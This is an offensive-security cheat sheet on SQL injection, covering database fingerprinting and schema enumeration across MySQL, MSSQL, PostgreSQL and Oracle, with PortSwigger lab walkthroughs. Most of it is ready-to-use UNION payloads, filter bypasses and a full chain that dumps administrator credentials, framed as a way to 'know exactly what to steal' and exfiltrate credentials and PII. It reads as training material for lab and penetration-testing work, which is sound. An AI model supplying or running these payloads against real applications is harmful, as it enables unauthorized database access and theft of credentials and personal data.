# SQL injection - Examining the database

Once you have an injection foothold, fingerprint the DB and enumerate its schema so you know exactly what to steal. This is the connective tissue between "I can inject" and "I dumped the right table." Max impact: a precise map of every table/column -> targeted exfil of creds/PII/secrets.

## Quick reference

```
-- version / fingerprint
' UNION SELECT @@version, NULL--                 -- MySQL / MSSQL
' UNION SELECT version(), NULL--                 -- PostgreSQL
' UNION SELECT banner, NULL FROM v$version--     -- Oracle
-- list tables
' UNION SELECT table_name, NULL FROM information_schema.tables--      -- MySQL/MSSQL/PG
' UNION SELECT table_name, NULL FROM all_tables--                     -- Oracle
-- list columns of a table
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_x'--
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_X'--   -- Oracle (UPPERCASE)
```

Decision list:
- Which version query works -> which DB you're on.
- Postgres/MySQL/MSSQL -> `information_schema`. Oracle -> `all_tables`/`all_tab_columns`, names UPPERCASE, every SELECT needs FROM.
- Lab table/column names are **randomized** (`users_abcde`, `password_xyz`) -> you must enumerate, never guess.
- Watch for decoy tables (e.g. `USERS_AND_ROLES`) - pick the one with the random suffix.

## Root cause
A visible/UNION-capable SQLi plus the database's own metadata catalog (ANSI `information_schema`, Oracle data dictionary). These catalogs are readable by the app's DB user by default.

## Find it (recon and detection)
- You already have UNION working (`../UNION-based/`) - column count and a string column known.
- **Fingerprint** by trying each version query; the one that returns instead of erroring identifies the engine. Error wording also leaks the engine (e.g. "ORA-", "syntax error at or near", "You have an error in your SQL syntax ... MySQL").

## Technique
**1. Version / type.**
- MySQL/MSSQL: `@@version`. Postgres: `version()`. Oracle: `SELECT banner FROM v$version` or `SELECT version FROM v$instance`.

**2. List tables.**
- ANSI: `SELECT table_name FROM information_schema.tables`.
- Oracle: `SELECT table_name FROM all_tables`.

**3. List columns of the interesting table.**
- ANSI: `SELECT column_name FROM information_schema.columns WHERE table_name='users_x'`.
- Oracle: `SELECT column_name FROM all_tab_columns WHERE table_name='USERS_X'` (uppercase).

**4. Dump.** `SELECT username_x, password_x FROM users_x` (or concat into one column - see `../UNION-based/`).

**Advanced / edge cases:**
- **MySQL one-shot table+col:** `SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()`; columns via `... information_schema.columns WHERE table_schema=database()`.
- **Current DB/user/privs:** `database()`/`current_database()`, `current_user`, `SELECT * FROM information_schema.user_privileges`.
- **Oracle no information_schema:** must use `all_tables`/`all_tab_columns`/`user_tables`. Identifiers fold to UPPERCASE unless quoted at creation.
- **Reading creds across schemas:** `information_schema.tables.table_schema` to enumerate other databases the user can see.
- **Postgres system catalogs:** `pg_catalog.pg_tables`, `pg_user` (sometimes `passwd`/`rolpassword`).
- **Find columns by name across all tables:** `SELECT table_name,column_name FROM information_schema.columns WHERE column_name ILIKE '%pass%'`.

## Payload arsenal
```sql
-- fingerprint
' UNION SELECT @@version,NULL--                          -- MySQL/MSSQL
' UNION SELECT version(),NULL--                          -- PostgreSQL
' UNION SELECT banner,NULL FROM v$version--              -- Oracle
-- enumerate (ANSI)
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcde'--
' UNION SELECT username_x,password_x FROM users_abcde--
-- enumerate (Oracle)
' UNION SELECT table_name,NULL FROM all_tables--
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_ABCDE'--
' UNION SELECT USERNAME_X||'~'||PASSWORD_X,NULL FROM USERS_ABCDE--
-- MySQL one-shot
' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--
```

## Bypasses
| Blocker | Bypass |
|---|---|
| `information_schema` blocked | Oracle `all_tables`; Postgres `pg_catalog.pg_tables`; MySQL `mysql.innodb_table_stats` |
| quotes around table name filtered | hex/`CHAR()` the name: `table_name=0x7573657273` (MySQL) |
| keyword filter | inline comments / encoding - see `../WAF-filter-bypass/` |
| Oracle case mismatch | UPPERCASE the table_name in WHERE |

## Exploitation walkthrough (Oracle full chain)
1. Fingerprint: `' UNION SELECT banner,NULL FROM v$version--` -> Oracle.
2. Tables: `' UNION SELECT table_name,NULL FROM all_tables--` -> candidates `USERS_AND_ROLES` (decoy), `USERS_PALVBZ` (real, random suffix).
3. Columns: `' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS_PALVBZ'--` -> `USERNAME_KWGMQP`, `PASSWORD_MQLHDQ`.
4. Dump: `' UNION SELECT USERNAME_KWGMQP||'~'||PASSWORD_MQLHDQ, NULL FROM USERS_PALVBZ--` -> `administrator:1po409oxslcr6yitm1df`.
5. Log in -> solved. *(All steps verified hands-on.)*

## Chaining
- Feeds [UNION-based](../UNION-based/) (you enumerate, then dump).
- Creds -> [Authentication](../../Authentication/), [Access-control](../../Access-control/).
- Secrets/tokens in config tables -> [SSRF](../../SSRF/), API abuse, cloud pivot.

## Tools
- **Burp Repeater:** step through fingerprint -> tables -> columns -> dump.
- **sqlmap:** `--dbms`, `--tables`, `--columns`, `--dump` automate the entire catalog walk.

## Labs

### Lab: querying the database type and version on Oracle [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
- Method: `' UNION SELECT BANNER, NULL FROM v$version--` (cols=2). Banner renders -> solved. Verified.
- Insight: Oracle SELECT needs FROM; `v$version` supplies the banner. Real-target transfer: fingerprint by which version query succeeds.

### Lab: querying the database type and version on MySQL and Microsoft [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
- Method: `' UNION SELECT @@version, NULL#` -> e.g. `8.0.42` (MySQL). Verified. Insight: `@@version` covers both MySQL & MSSQL; MySQL comment `#`/`-- `.
- Real-target transfer: if `--` breaks but `#`/`-- ` works -> MySQL family.

### Lab: listing the database contents on non-Oracle databases [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
- Method: `information_schema.tables` -> `users_tgewjl`; `information_schema.columns WHERE table_name='users_tgewjl'` -> `username_nmoaxd`,`password_vacrxx`; dump -> `administrator:5rbc5fvfduykdpyrn42d`; log in. Verified.
- Insight: randomized names force enumeration. Real-target transfer: the universal fingerprint->map->dump chain.

### Lab: listing the database contents on Oracle [Practitioner]
- URL: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
- Method: `all_tables`/`all_tab_columns` (UPPERCASE table_name), skip decoy `USERS_AND_ROLES`, dump `USERS_PALVBZ` -> `administrator:1po409oxslcr6yitm1df`; log in. Verified.
- Insight: Oracle has no information_schema; identifiers UPPERCASE; beware decoy tables.

## Real-world notes
- Schema enumeration is usually the step that turns a "proof" SQLi into a reportable data-breach PoC - quote the table/column names you read.
- Don't exfiltrate real user data on live targets; demonstrate access (table names, your own row, a count) and stop.
- Some hardened apps run the DB user with restricted catalog access - `information_schema` may be empty; pivot to brute-forcing common table names.

## References
- https://portswigger.net/web-security/sql-injection/examining-the-database
- https://portswigger.net/web-security/sql-injection/cheat-sheet
